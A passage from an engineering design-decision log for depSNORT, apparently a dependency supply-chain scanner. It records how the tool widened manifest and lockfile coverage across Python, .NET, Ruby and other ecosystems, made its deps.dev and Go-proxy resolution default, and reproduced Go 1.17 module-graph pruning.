coverage channel D-59 uses, so they degrade coverage, print `NOT an all-clear`,
and gate under `-fail-on-incomplete`. A `nothing-to-scan` root that nonetheless
has subdirectory projects now discloses them (and points at `-recursive`) rather
than exiting silent. A genuine single-project directory with no siblings and no
subdir projects stays quiet, and `-recursive`'s own discovery/node counts are
unchanged. The rule holds: depSNORT never exits green while a dependency-bearing
artifact in scope was silently skipped.

## D-61 — OPU-13: non-canonical requirements siblings are scanned, not just the canonical one

Within a directory the PyPI adapter claims, only the canonical `requirements.txt`
(plus `Pipfile.lock` / `pyproject.toml` / `setup.py`) was read. Sibling files with
non-canonical names — `requirements-dev.txt`, `test-requirements.txt`,
`dev-requirements.txt` — were never read unless the root file explicitly
`-r`-included them. Split requirements is a dominant Python convention, and
dev/test/CI dependencies are a real install-time surface; leaving them unread is
the false-clean class again, and pinning a poisoned dev dependency in
`requirements-dev.txt` was a way past the scanner.

D-54 already follows `-r`/`-c` includes; D-61 extends coverage to the flat
siblings a project did not chain. A requirements file is recognized by the
convention itself — a `.txt` whose name contains "requirements" (so
`constraints.txt`, which constrains rather than installs, is deliberately
excluded). Detection now claims a directory (or a directly-pointed file) on any
such name, not just the canonical one, so a project shipping only
`requirements-dev.txt` is no longer "nothing to scan". Resolution reads every
same-directory sibling into the SAME project root, carrying the include walk's
`visited` set so a sibling already pulled in via `-r` is never read twice, every
read contained by the same securefs reader, and an unreadable sibling disclosed
like an unfollowed include rather than dropped (D-24). A lone `requirements.txt`
with no siblings stays exactly as before — no disclosure, no extra nodes.

Chosen the fuller option (read the siblings) over mere disclosure: turning an
unread dependency surface into actual coverage is the tool's purpose, and the
same containment and dedupe the `-r` path already earned make it safe.

## D-62 — OPU-14: NuGet node names stay canonical case for the OSV coordinate

A `packages.lock.json` with genuinely vulnerable packages resolved and scanned
but reported ZERO CVEs. The NuGet parser set each node's Name to the LOWERCASED
package id, and the OSV coordinate is built straight from the node's Name
(`Coord{Name: n.Name}`, both in the main scan and expansion). OSV's NuGet
ecosystem is case-SENSITIVE on the name, so `newtonsoft.json` missed the
advisory `Newtonsoft.Json` carries — every NuGet advisory lookup silently missed,
and a vulnerable .NET project scanned green. A silently disabled core check for a
whole ecosystem is the worst kind of false-negative: no error, no gap, just a
clean report.

NuGet package ids are case-insensitive for RESOLUTION, so identity and dedup
still fold case — but that folding was wrongly applied to the OSV-facing name
too. Nothing depended on `n.Name` being lowercased: dedup keys on a separate
lowered map, the PURL id lowercases independently (`purl.NewNuGet`), and edge
resolution uses its own lowered maps. The fix sets `n.Name` to the lockfile's
canonical case; identity, dedup, and edges are unchanged.

The rule this establishes: fold case for NuGet identity/dedup, never for the
OSV/registry coordinate. It applies to every future NuGet input (the
packages.config and Paket work in this same round observe it). npm is
lowercase-canonical and PyPI normalizes, so both are unaffected; Cargo, Go, gem,
and Composer preserve case already.

## D-63 — OPU-15: NuGet packages.config is parsed, not just disclosed

`packages.config` — the legacy .NET Framework XML manifest, still common in the
wild — was on the D-59 recognized-manifest list, so a directory carrying one was
DISCLOSED as incomplete coverage (an honest gap, not a silent skip). But it was
never parsed: NuGet support was effectively `packages.lock.json`-only, and the
package doc comment ("packages.config only — PackageReference ignores it")
implied a capability that did not exist. Disclosure is the floor, not the goal —
a real, readable dependency surface should be scanned, not merely flagged as
unread.

`packages.config` is a FLAT resolved list — `<package id="X" version="Y"
targetFramework="Z" />` entries, both direct and transitive, with no dependency
graph. The parser (`parsePackagesConfig`, `encoding/xml`) emits one direct node
per entry hung off the project root at depth 1. Three deliberate choices:

- **Canonical-case names.** Names come straight from the `id` attribute,
  unfolded, so the OSV coordinate matches — the D-62 rule (fold for
  identity/dedup, never for the OSV/registry coordinate) applied to this new
  input. The PURL id still lowercases via `purl.NewNuGet`, so dedup and identity
  are unchanged.
- **A leading UTF-8 BOM is stripped.** Windows-authored configs routinely carry
  one; `encoding/xml` rejects a BOM before the declaration, so it is trimmed
  first. (The regression fixture carries a real BOM to lock this in.)
- **Empty or malformed degrades honestly.** A truncated file is an
  `xml.Unmarshal` error; a well-formed file with no `<package>` entries returns
  "contained no packages". Both surface as an adapter error the scan flow turns
  into incomplete coverage (D-24) — never a crash, never a silent clean pass.

`packages.lock.json` (a full resolved tree) still takes precedence when both are
present, mirroring the directory resolution order. `packages.config` is removed
from the `gap.go` recognized-manifest map: it is now claimed by the adapter's
Detect and never reaches the gap path, so listing it there would be dead code
that risks double-counting.

## D-64 — OPU-16: RubyGems scans a lock-less Gemfile manifest-only

A Ruby project committing a `Gemfile` but no `Gemfile.lock` — the common
gem-library convention, where the lock is git-ignored — was DISCLOSED via D-59
(the `Gemfile` was on the gap.go recognized-manifest list) but never scanned.
RubyGems support was effectively `Gemfile.lock`-only. This is the same gap OPU-11
closed for Composer (`composer.json` manifest-only), still open for gem: the
adapter itself was sound (a project committing its lock scanned fully), only the
manifest-only path was missing.

The fix mirrors the npm/PyPI/Composer manifest-only handling. `Detect` now claims
a directory (or file) whose `Gemfile` declares at least one gem, when no
`Gemfile.lock` is present; the lock still takes precedence when both exist
(observed versions beat presumed). `parseGemfile` reads the Ruby DSL line by
line and records each `gem 'name'[, 'constraint'...]` as a declared dep on the
root (`AttrDeclaredDeps`), which the expansion tier presumes or asserts a version
for (D-44) via the RubyGems `WalkSource` already wired for the lock path. The
root is marked flat (`AttrFlatResolution = "gem"`, `AttrUnresolved`) so a
manifest-only project degrades coverage rather than reading as a fully-resolved
clean tree — the same disclosure the other manifest-only ecosystems make.

The Gemfile is a Ruby program, not a resolved list, so the parser is deliberately
tolerant and line-based (the posture of the Poetry constraint reader):

- Only a line whose first token is exactly `gem` (followed by whitespace, a
  quote, or `(`) is a declaration — `source`, `ruby`, `group`, `gemspec`,
  `git_source`, and `#` comments are skipped. Gems nested in a `group … do`
  block are still read (they are still declared dependencies).
- Positional quoted arguments are the name and its version constraints; the
  first `key:`/`:symbol` option (`require:`, `git:`, `github:`, …) ends the
  positional run. A gem pinned to a git/path/github source is thus scanned by
  name with no constraint, rather than dropped.
- Multiple version constraints (`gem 'puma', '>= 5.0', '< 6.0'`) are comma-joined
  into RubyGems AND semantics, which `SatisfiesRuby` already understands.

Gem names are case-sensitive and scope-free, so — unlike NuGet (D-62) — nothing
is folded: `WalkSource.Identify` uses the name verbatim, and the parser records
it verbatim. A `Gemfile` declaring no gems is an error the scan flow turns into
incomplete coverage, never a silent clean pass, and such a directory is not
claimed. `Gemfile` is removed from the gap.go recognized-manifest map: it is now
claimed by the adapter and never reaches the gap path.

`.gemspec` `add_dependency` extraction is a reasonable follow-up but out of scope
here — the minimum closes the common Gemfile-only gap.

## D-65 — OPU-17: Paket is parsed, and an unrecognized lockfile is disclosed

A Paket-managed .NET project (`paket.lock` + `paket.dependencies`) read as a
SILENT "nothing to scan" — worse than a `packages.config` or `Gemfile`, which at
least reached the D-59 gap list. Paket was on no map and detected by no adapter,
so a real dependency surface was invisible with no signal at all. This closes it
two ways: a specific parser, and a general safety net.

**Parse paket.lock.** Paket packages ARE NuGet packages — same registry, same
`pkg:nuget/` coordinate, same case-sensitive OSV ecosystem — so `paket.lock` is
parsed by the nuget adapter into ordinary nuget nodes with real resolved
versions (enabling OSV CVE detection), rather than a new ecosystem. Only
`NUGET`-group entries become nodes; `GITHUB`/`GIT`/`HTTP` sections point at
non-NuGet sources and are skipped. Grouped sections (`GROUP Build` → its own
`NUGET` block) are read. Names are kept canonical-case for the OSV coordinate
(the D-62 rule; folded only for id/dedup/edges), a package listed both as a
resolved entry and another package's dependency is one node, and inter-package
edges are built from the indented dependency lines. A `paket.lock` with no NUGET
packages is an error the scan turns into incomplete coverage, never a silent
clean pass. `packages.lock.json` (the standard MSBuild lock) still takes
precedence when both are present. `paket.dependencies` (the lock-less manifest)
is added to the gap.go map (→ nuget) so a Paket project committed without its
lock is still disclosed.

**Hail-mary catch-all for any unrecognized lockfile.** Beyond Paket, the
disclosure layer now has a last-ditch tier: a file whose suffix is `.lock` and
which no name/ext table or adapter recognizes is disclosed as an
`unknown`-ecosystem gap rather than skipped in silence. This catches the long
tail depsnort has no specific recognizer for — Elixir `mix.lock`, CocoaPods
`Podfile.lock`, Dart `pubspec.lock`, Nix `flake.lock` — turning each from a
false-clean exit 0 into an honest incomplete-coverage note. Two properties keep
it safe:

- **It never fires on a lock a real adapter reads.** `Cargo.lock`,
  `composer.lock`, `yarn.lock`, `Gemfile.lock`, `Pipfile.lock`, and `paket.lock`
  all end in `.lock`; an explicit denylist excludes them so a handled lock is
  never mislabeled `unknown`. (In the live flow their directories are claimed and
  never reach the classifier anyway; the denylist keeps the pure function's
  contract honest for any future caller.)
- **Over-disclosure is the safe direction.** A catch-all match only degrades
  coverage — a note gated under the opt-in `-fail-on-incomplete` — never a false
  block. The failure it closes is the dangerous one: a real dependency surface,
  in scope, skipped in total silence. This is the founding principle stated
  generally: a lockfile depsnort cannot read becomes a disclosed gap, not a green
  checkmark meaning "did not look." The catch-all is deliberately narrow (`.lock`
  only) and trivially extended (e.g. `.lockfile`) as new formats surface.

## D-66 — OPU-18: the gap.go recognition tables are widened, under a dedication rule

The D-59 disclosure layer had a well-built three-tier classifier (exact name →
ecosystem; dedicated extension → ecosystem; a `.lock` catch-all → "unknown") but
minimal tables: the extension tier held only the NuGet project files, and a long
list of dependency-bearing files went SILENT — a directory carrying only a
`.gemspec`, `.podspec`, `.vcxproj`, `.cabal`, `.nimble`, `build.sbt`,
`gradle.lockfile`, `bun.lockb`, `.terraform.lock.hcl`, `mix.exs`, or
`Directory.Packages.props` read as "nothing to scan" at exit 0. This is pure
disclosure work (D-59): none of it resolves dependencies, and a gap match only
degrades coverage into a note gated under `-fail-on-incomplete`, never a block.

The tables now cover:

- **Dedicated per-project extensions** (`gapManifestByExt`): `.vcxproj`,
  `.gemspec`, `.podspec`, `.cabal`, `.nimble`, `.sbt` — joining the existing
  `.csproj`/`.fsproj`/`.vbproj`. Each is a suffix whose name varies per project
  but which exists solely to declare dependencies.
- **Non-`.lock` locks and general-extension manifests** (`gapManifestByName`):
  `gradle.lockfile`, `bun.lockb`, `.terraform.lock.hcl`, `mix.exs`,
  `Directory.Packages.props`, `pubspec.yaml`, `Podfile`, `Package.swift`.
- **Attribution promotions**: `mix.lock`, `Podfile.lock`, `pubspec.lock`,
  `flake.lock`, `conan.lock`, `deno.lock` already disclosed via the `.lock`
  catch-all as "unknown"; naming them reports the real tool (elixir, cocoapods,
  dart, nix, conan, deno). They are gaps, not parsed, so they are deliberately
  NOT added to `adapterHandledLocks`.

**The guardrail, stated in the code: dedication.** An extension is added to a
table ONLY if it exists solely to declare dependencies. A general extension used
for many non-dependency purposes — `.exs` (any Elixir script), `.props` /
`.targets` (any MSBuild fragment), `.hcl` (mostly Terraform config), `.yaml` /
`.toml` / `.json` — is NEVER blanket-added; it would manufacture false
disclosures on unrelated files. Such ecosystems' real manifests go in the
exact-name table instead (`mix.exs`, `Directory.Packages.props`,
`.terraform.lock.hcl`), so a bare `Custom.props` or an arbitrary `foo.exs` stays
silent. This is what lets the net be wide without becoming noisy.

`go.work` was in the proposed set but omitted: it is a workspace aggregator whose
local `use` modules are each scanned on their own, so disclosing the workspace
file as an unread gap would be a spurious note on an already-covered repo — the
same dedication reasoning applied to a name. A dot-prefixed FILE like
`.terraform.lock.hcl` is reached because the walk's dot-skip is directory-only;
file-level classification has no hidden-file filter (regression-tested).

## D-67 — OPU-19..24: full-send is the default scan posture

The scan posture was "one repo, one adapter, shallow, capped": a directory was
claimed by a single ecosystem, the walk stopped at depth 8, build-output dirs
were pruned, gap disclosure was capped at 50, and recursion was opt-in. Real
evidence showed the cost — gitlab lost 3 of 4 ecosystems to one-adapter-per-dir,
tpotce lost 100% of its coverage to `dist/` pruning, Titanis's disclosure was
capped at 50 of 127. A single-repo scan now resolves everything present by
default and discloses only what is genuinely unresolvable.

Six coupled changes, landed together because a re-baseline only stabilizes once
all are in and two of them are wrong in isolation:

- **OPU-21 co-scan.** `discoverProjects` uses `Registry.DetectAll`, emitting one
  project root PER ECOSYSTEM per directory. A dir with yarn.lock + Gemfile.lock +
  Pipfile.lock scans all three. Each adapter still selects its own single
  manifest, so there is no intra-ecosystem double-count; node-ID dedup collapses
  shared packages across the merged roots.
- **OPU-19 build dirs.** `skipDirs` splits into `neverDescend` (node_modules,
  vendor, venv, site-packages, VCS, tooling caches — installed/vendored copies of
  already-resolved trees, pruned always) and the descended build dirs. Only
  `dist/` descends by default: the `DEPSNORT_FULLSEND` probe (run against realistic
  BUILT trees, since these dirs are normally gitignored) showed `dist/` holds real
  source (Docker build contexts, tpotce) while `target/` and `build/` hold a
  generated copy of the root manifest on any built Maven or `cargo package`d tree —
  a universal double-disclosure. `target/`/`build/` move behind `-include-build-dirs`.
- **OPU-22 no depth bound.** `maxWalkDepth` is gone — a numeric bound is the same
  silent-truncation sin as the 50-cap at a different threshold. `filepath.WalkDir`
  never follows symlinks, so the only residual cycle risk is an exotic bind-mount
  loop; a per-walk visited (device, inode) set (build-tagged, Unix; no-op
  elsewhere) bounds that by actual cycles rather than by depth.
- **OPU-20 no gap cap.** `maxGapProjects` is removed: a repo with 127 unresolved
  `.csproj` discloses all 127, never a silent "50 of 127". Scanned projects were
  never capped; only disclosure was.
- **OPU-23 recursive by default.** `scan` and `baseline create` default to
  full-send; `-no-recursive`/`-shallow` restricts to the given directory (still
  co-scanning every ecosystem in it), and a single manifest FILE pointed at
  directly is always a single target. Baseline discovery mirrors scan exactly, or
  the first drift report would be the tool disagreeing with itself.
- **OPU-24 gap reconciliation.** With every ecosystem co-scanned and full depth
  reached, the old "unscanned-ecosystem … one ecosystem per directory" disclosure
  is not just dead but WRONG — it reported gem/pypi as dropped in the same run
  that now scans them (the probe caught this contradiction directly). It is
  removed. The subdirectory-projects disclosure survives only on the
  `-no-recursive` path. A "gap" now means exactly one thing: depSNORT recognizes
  this manifest but has no resolver for it — never "chose a different ecosystem"
  or "you forgot -recursive."

The two walks (project discovery and gap discovery) share `skipWalkDir`, so they
cannot disagree about what a scan reaches. What this does NOT do: no new
resolvers (gemspec `add_dependency`, `.csproj` PackageReference stay disclosed,
not scanned — the only remaining gaps, and honest structural ones), and no
bulk/corpus mode (one repo at a time, full-send). Node counts move on real repos
(gitlab ~2,260 → ~5,350; tpotce 0 → 41); the offline probe measured pure
discovery/resolution deltas — the CVE surface moves too once the recovered
ecosystems get live OSV, which the post-merge validation run measures.

## D-68 — OPU-25: build/ and target/ descend by default, artifact subdirs pruned

D-67 (OPU-19) held `build/` and `target/` behind `-include-build-dirs`, on the
probe finding that they hold generated copies of the root manifest (Maven's
packaged pom, cargo's `target/package` lock) that inflate counts. That was too
broad. Real evidence: Titanis keeps four real .NET projects under `src/build/…`
(build-*tooling* source, not build output); the `dist`-only default silently
pruned them, disclosing 123 of 127 `.csproj`. The directive — if a `build/` or
`target/` directory holds actual dependencies, expose them by default — and the
constraint — suppress the generated copies — agree: the duplication lives in
specific tool-output SUBdirectories, not the whole tree.

So `build` and `target` join `dist` in `buildDirs` (descended by default), and
the generated-artifact copies beneath them are pruned by a curated set of
tool-output subdirectory names (`buildArtifactDirs`: Maven `classes` /
`generated-sources` / `maven-status`, cargo `package` / `debug` / `deps` /
`.fingerprint`, Gradle `generated` / `intermediates` / `libs`, …).

The one subtlety is that this must be **path-contextual, not global**. Several of
those names (`classes`, `package`, `resources`, `debug`, `release`, `libs`,
`tmp`, `doc`) are legitimate SOURCE directory names outside a build tree — a
Python `package/`, a `resources/` source root. `buildArtifactDirs` is consulted
ONLY when the walk is inside a `build/`/`target/` subtree (`insideBuildTree`
checks the path's ancestors), so a real `src/package/` is untouched. These names
are deliberately NOT added to `neverDescend`, which prunes globally. This keys on
WHERE a file is (a known generated location), never on WHAT it contains — it is
not the content-based root-dedup the architecture spec ruled out, so a genuinely
distinct project under `build/` is exposed even if its dep set matches another's.
`dist/` is excluded from the artifact-context check: its contents are real
source, not compiler output, and it never carried the copy problem.

`-include-build-dirs` is retired; `-no-build-dirs` is its inverse — skip `build/`
and `target/` entirely for the rare user scanning a fully-built tree where even a
duplicate disclosure is unwanted. `dist/` is never suppressed.

`buildArtifactDirs` is curated, not exhaustive: an unlisted output subdir leaks a
DUPLICATE disclosure — a harmless note, never a false block or false CVE. That is
the safe direction. Over-exposing a generated copy is a cosmetic gap-count bump;
under-exposing real source hides actual dependencies, which is the failure this
closes. If a tool's layout is found to leak, its subdir is added to the list.

## D-69 — OPU-12 D-1: pyproject extras are parsed into the declared surface

depSNORT read only a pyproject's core `[project] dependencies` (and the Poetry
table); `[project.optional-dependencies]` — the extras — was ignored entirely.
For a real repo that is where most of the dependency surface lives: soup-cli
declares 62 packages, 55 of them in extras (the whole heavy ML stack — torch,
transformers, vllm, deepspeed). A supply-chain IDS that reads 7 of 62 declared
packages is looking at a thin shell.

Each key under `[project.optional-dependencies]` is a named extra whose value is
a PEP 508 array. A default install pulls none of them, but any of them CAN be
installed, so the honest surface for a scanner is the UNION of every extra's
dependencies — the maximal set an install could pull. That union is emitted as
declared deps, deduped by name downstream, parsed with the same comment-stripping
(D-…/OPU-11) and quote-aware bracket matching as the core array.

Two hazards the extras block introduces, both handled:

- **Self-reference.** A meta-extra like `all = ["soup-cli[train,mlx]"]` or
  `dev = ["soup-cli[all]"]` names the project's OWN distribution to pull in its
  local extras. Emitting that name would be a dependency-confusion false positive
  on the project against itself — and it is redundant, since every extra is
  already iterated into the union. A dependency whose normalized name equals the
  `[project].name` is therefore skipped, not emitted. (Its referenced extras'
  deps are present regardless, because all extras are unioned.)

- **Cross-extra pin split.** `train` pins `transformers<5.0.0`, `mlx` pins
  `>=5.0.0`. These are mutually exclusive PROFILES, not a contradiction. Because
  declared deps are deduped by NAME before expansion (one constraint per package
  reaches the walker), the two never accumulate onto a single node, so the split
  is not mis-reported as an unsatisfiable `contested`. Extras are iterated in
  sorted order, so which representative constraint survives is deterministic.

Collapsing mutually-exclusive profiles to a union is deliberate: for an IDS the
union IS the answer — every package any extra could install is in the blast
radius, and that is exactly what must be examined. Resolving one named profile
per invocation is a possible future refinement, not a correctness need here.

## D-70 — OPU-12 D-2: the asserted (deps.dev) tier is default-on

Every default scan expanded the transitive closure on PRESUMED versions — this
tool's guesses at what an installer would pick — while the asserted tier
(deps.dev's whole resolved graph, a concrete version on every node) sat behind
an opt-in `-depsdev`, default off. For a supply-chain IDS whose primary work
product IS the resolved transitive closure (real-world attacks live 4–8 hops down
it), that meant the authoritative artifact ran on guesswork by default, and a
presumed walk truncates before the depths an asserted walk reaches.

The asserted tier is now default-on (Option A of the handoff). `-offline` (no
network) and a new `-no-depsdev` both fall back to the presumed walk. The gate is
one pure function, `useAssertedTier(depsDev, noDepsDev, offline)` =
`depsDev && !noDepsDev && !offline`. The tier asserts each root's
registry-queryable DIRECT dependencies (their depth-1 coordinates are published);
the synthetic unpublished project root (`name@0.0.0`) is never queried
(`registryQueryable` guard, the OPU-06 hardening), so "0 asserted for the root"
is expected and correct — the assertions land on the direct deps.

**Honest degradation, keyed on the outcome not the flag.** When the closure was
discovered but NOTHING was asserted (`asserted == 0 && discovered > 0`), the
report carries a run-level note that the closure rests on presumed versions and a
clean result over it is not an authoritative all-clear. Crucially this keys on
`asserted == 0`, not on "the resolver was nil": it fires equally when the tier
was not consulted (`-offline`/`-no-depsdev`) AND when deps.dev was consulted but
unreachable — so a silently-failed asserted fetch cannot pass an entirely-presumed
closure off as fact. (The per-node version-truth axis already marks each node
presumed/asserted; this is the summary a reader needs so a presumed "0 findings"
does not over-claim.) The note rides on a new `DataSourceCoverage.Note` field, so
it is in the report, not only on stderr.

Defaulting a network call on is a real departure from the air-gap-by-default
posture (D-09/D-13), taken deliberately: a verdict presented as authoritative
should rest on resolved facts. `-offline` remains a first-class, fully-honest
mode — it simply discloses that its closure is presumed.

## D-71 — OPU-12 D-3: findings carry their root→node dependency path

With the full transitive closure now scanned (D-1 breadth, D-2 asserted depth),
a finding can sit 6+ hops down the resolved graph, in a package nobody declared
and nobody reads. Its first question is "why is this even here?" The graph
carried the edges; the emitters did not surface the chain.

Each finding now carries `DepPath` — the shortest dependency chain from a project
root to the subject node, `[root, …, node]`, computed by multi-source BFS over
depends-on edges (`graph.PathToNode`). It is attached to the findings slice
BEFORE the verdict runs, so every downstream copy (the ranked `res.Findings` and
each `graph.Node.Findings`) inherits the same value. JSON emits it as `dep_path`
(the authoritative record); SARIF carries it as a `dep_path` result property and
the PDF as a `Path:` line. It is empty for a root or a node reachable by no
depends-on edge (an install-hook subject), so callers skip a length-≤1 chain.

The path keys on graph topology only, never on content, and the BFS is made
deterministic (sorted roots and adjacency) to keep a CI diff reproducible (D-09).
The handoff's richer form — prefixing the chain with the DECLARING EXTRA
(train → torch → …) — needs per-edge extra provenance that D-1 did not thread
through declared deps into the graph; it is a clean follow-on, and the
dependency-path core (the actionable "why is it here") lands here.

## D-72 — OPU-13: Go modules get a native asserted tier (goproxy MVS)

OPU-12 D-2 made the asserted tier default-on, but it delivered only for PyPI and
Cargo — Go got nothing (a run-delta showed a pure-Go repo byte-identical before
and after). The root cause is structural, not a missing mapper case: deps.dev's
v3 `:dependencies` endpoint 404s for every Go coordinate. deps.dev HAS Go
package/version data, but does not expose resolved dependency GRAPHS for Go, so
the asserted tier — built solely on that endpoint — cannot cover Go by
construction. Verified: adding `case "gomod": return "go"` to `depsdev.system()`
leaves a Go repo at 0 asserted; it only converts a silent skip into a stream of
404s. That mapper case is therefore deliberately NOT added.

The fix is a Go-native resolver on infrastructure already in the tree.
`internal/datasource/goproxy` talks to proxy.golang.org — the public,
zero-execution source `go` itself reads — and exposes `ModFile` (raw go.mod,
whose `require` block IS the dependency set). A new `gomod.Resolver` satisfies
`expand.Resolver` over it: fetch a coordinate's go.mod (reusing the adapter's own
`scanGoMod`), recurse, and apply MINIMAL VERSION SELECTION — the selected version
of a module is the MAXIMUM any reachable module requires, to a fixpoint that
re-reads each module at its selected version. That fixpoint is the actual work
and the reason it is a resolver, not a fetch loop: naive recursion mis-versions a
module two paths require differently. `+incompatible` (build metadata, stripped),
same-base pseudo-versions (14-digit timestamps order lexically as numerically),
and major-version path suffixes (`foo` vs `foo/v2` are distinct module-path keys)
all fall out correctly. A 404 on the queried coordinate returns ok=false so the
walk falls back to presume — the same contract deps.dev's resolver honors.

The asserted tier becomes MULTI-SOURCE: a dispatching `assertedResolver` routes
by ecosystem — deps.dev for pypi/npm/cargo/nuget/gem, the goproxy resolver for
gomod — so Go is NEVER handed to deps.dev (zero 404 traffic). `expand`/`AssertRoot`
stay ecosystem-agnostic; a small optional `expand.EcosystemNamer` lets the
dispatcher attribute each asserted node to the backend that answered, so a Go
node reads `asserted_by: go-proxy` and a PyPI node `deps.dev`.

This is MORE aligned with depsnort's charter than deps.dev ever was for Go:
go.mod is static text, MVS is deterministic, the proxy is cacheable and is the
exact source `go` reads — zero execution (D-04), deterministic (D-09),
offline-capable. Under `-offline` the tier is off and Go degrades to presumed
with the same disclosure banner PyPI/Cargo emit (D-70), keyed on asserted==0.

Verified live against proxy.golang.org: a one-require go.mod (logrus v1.9.0)
resolved its full transitive tree as 7 asserted nodes with concrete
MVS-selected versions, each attributed to go-proxy — the exact null-delta the
run-delta flagged, now closed.

## D-73 — OPU-14: Go MVS reads the full module graph, not selected versions only

OPU-13's Go asserted resolver computed MVS by reading the go.mod of the SELECTED
version of each module only. Classic (pre-1.17) MVS reads the go.mod of EVERY
version that appears in the module graph, including versions later superseded by
a higher selection. A superseded lower version can carry a HIGHER requirement
for a third module, and that requirement still counts in Go's build list — so a
selected-only read undershoots that third module's selected version.

This is not cosmetic: depSNORT runs its advisory/typosquat checks on the SELECTED
version of each node, so a mis-selected transitive version means evaluating the
wrong artifact — missing a CVE that affects the version a real build uses, or
flagging one that does not apply. Proven on shellz: MVS diverged from
`go list -m all` on exactly one module, google.golang.org/appengine (v1.5.0 vs
Go's v1.6.5). The only requirers of appengine@v1.6.5 are cloud.google.com/go@v0.52.0
and cloud.google.com/go/storage@v1.5.0 — BOTH superseded (by v0.54.0 / v1.6.0,
which drop the requirement). The old fixpoint re-read only the selected version
after a bump, so it never saw the v1.6.5 requirement Go retains.

The fix replaces the selected-only fixpoint with a full-module-graph worklist:
read the go.mod of every module@version encountered (superseded or not, keyed by
the exact coordinate), taking the max version per module across all of them.
Edges are still drawn at the selected versions (the resolved build graph). After
the fix, shellz matches `go list -m all` 139/139 (was 133/134).

This is unpruned pre-1.17 MVS. Go 1.17+ prunes the graph for a main module that
itself declares go 1.17+, so for such a module Go could select a LOWER version
than the full graph — i.e. this can theoretically OVER-include, never
UNDER-include. For a security scanner that is the correct, conservative
direction: the selected version is the one that could carry a vulnerability, and
you never want to evaluate a version lower than a real build resolves. Exact
parity with pruned builds, if ever required, would gate pruning on the main
module's go directive — but never at the cost of re-introducing under-selection.

## D-74 — OPU-15: a go 1.17+ Go closure is disclosed as unpruned (interim mitigation)

**Superseded by D-75.** This interim disclosure shipped before the pruning
feature, per its own sunset clause ("removed once static pruning lands and the
closure matches the oracle"). D-75 implements the pruning, so the closure is now
exact and the `gomod-graph` over-approximation note is retired.

D-73's MVS is unpruned pre-1.17 selection. Go 1.17 changed module resolution:
for a main module that itself declares `go 1.17+`, Go PRUNES the module graph —
it reads the full transitive requirements only of dependencies that are
themselves pre-1.17, and only the immediate requirements of `go 1.17+`
dependencies. depSNORT walks the full, unpruned graph, so for a `go 1.17+` main
its Go closure over-approximates the real build: extra modules, and shared
modules at extra versions. Measured on opensnitch/daemon (`go 1.25.0`): 384
resolved gomod nodes against `go list -m all`'s 64-module build list, with
golang.org/x/net at 8 versions and x/sys at 11. The advisory/typosquat checks
then run over versions that are in no real build.

The correct fix is static module-graph pruning (reproduce Go 1.17's pruned graph
from the `go` directives, no `go` execution), which is a feature, not a
one-liner — the OPU-15 hand-off empirically disproved both obvious shortcuts
against the `go list -m all` oracle: treating the go.mod require block as the
closed build list under-selects (opensnitch records 21 requires vs the real 64),
and collapsing the unpruned graph to the global max per module over-selects
(cloud.google.com/go → v0.112.1 where Go resolves v0.26.0, a deep requirement
Go's pruned graph never reads). Neither the floor nor the ceiling reproduces the
build list; only pruning does. That feature ships as its own oracle-proven cycle.

This decision is the interim mitigation that ships first: an over-approximation
presented as the build is the same over-claim OPU-11/12 fought, and silent is the
trap. So a `go 1.17+` main is DISCLOSED, exactly the way D-70 discloses a
presumed-only closure. The adapter records the main module's `go` directive on
the root node (gomod.AttrGoDirective); when transitive expansion runs over a root
whose directive is `>= 1.17` (gomod.HasPrunedModuleGraph), the report emits a
`gomod-graph` coverage note — in JSON and on stderr — stating that the Go closure
is unpruned and its gomod findings need build-list confirmation (`go list -m all`)
until pruning lands. Pre-1.17 mains (shellz, go 1.16) stay silent: pruning does
not apply and D-73's MVS is already exact. The disclosure is gated on expansion
because the over-approximation is a property of the expanded closure — the flat
go.mod list alone under-approximates (the pruned roots), so `-no-registry`
scans, which never expand, correctly emit nothing. The note is removed once
static pruning (the OPU-15 feature) lands and the closure matches the oracle.

Process: per the OPU-15 hand-off's standing rule, no resolver/parser change ships
as "fixed" without a patch-and-prove against ground truth, and a proposed fix is
not proven until the oracle agrees. This mitigation makes no resolution claim to
prove — it discloses that the existing claim is an over-approximation — so it
ships now; the pruning feature that changes resolution is held for its own
oracle-proven cycle.

## D-75 — OPU-15: static Go 1.17+ module-graph pruning (the feature)

D-74 was the interim disclosure; this is the feature it deferred. The asserted Go
resolver now reproduces Go 1.17's pruned module graph statically — no `go`
execution, only the `go` directives that go.mod files carry as text (D-04) — so a
`go 1.17+` main's resolved closure matches `go list -m all` exactly instead of
over-approximating.

The resolver switches on the queried main module's own `go` directive
(gomod.HasPrunedModuleGraph): a pre-1.17 main keeps classic unpruned full-graph
MVS (D-73, `selectFullGraph`, unchanged); a `go 1.17+` main runs pruned selection
(`selectPruned`). Pruning is a property of the PATH, not the module: the walk
carries an "unpruned" flag that a `go <= 1.16` dependency sets and that then
propagates to its entire subtree — so a `go <= 1.16` module contributes its full
transitive closure (including that closure's own `go 1.17+` modules), while a
`go 1.17+` module reached only through `go 1.17+` modules is a frontier whose
version and direct requirements count toward MVS but whose requirements'
requirements are pruned away unless some `go <= 1.16` module pulls them back in.
MVS then takes the max version per module over that pruned edge set — one selected
version per module, a build list, not a union of every version seen.

Both failure modes the hand-off disproved are avoided by construction:
go.mod-as-closed under-selects (it is the pruned roots, not the whole graph) and
global-max-collapse over-selects (it reads deep requirements Go's pruned graph
never walks — e.g. cloud.google.com/go's unpruned max vs Go's v0.26.0). Only
pruning reproduces the build list, and it was proven against the `go list -m all`
oracle in-sandbox:

```
opensnitch/daemon (go 1.25.0):  64/64 modules exact, incl cloud.google.com/go v0.26.0
xtls/xray-core    (go 1.26):   142/142 modules exact
spf13/cobra       (go 1.15):     6/6 modules exact  (pre-1.17: selectFullGraph, no regression)
```

Parser fix (found by the proof, not incidental): the modfile grammar lets a module
path or version be a quoted string literal, and real modules use it
(`kr/text@v0.2.0` writes `require "github.com/creack/pty" v1.1.9`; `gopkg.in/yaml.v2`
writes `module "gopkg.in/yaml.v2"`). The parser left the quotes on, so a quoted
path became a phantom module key distinct from its unquoted form — a duplicate
node at the wrong version. This diverged xray-core by exactly two modules until
`modToken` unquoted every path/version token. It is a general Go-resolution
correctness fix, independent of pruning.

The D-74 `gomod-graph` over-approximation note is removed: with pruning the
asserted closure is exact, and when the asserted tier is off (offline /
-no-depsdev) the Go closure is presumed and already disclosed as presumed-only
(D-70), so no Go-specific caveat is layered on top. The main module's `go`
directive is still recorded on the root node (gomod.AttrGoDirective) as
provenance. Edges remain best-effort at the selected versions; the acceptance
criteria and the checks that run on the graph are about node membership and
versions, which now match the oracle.

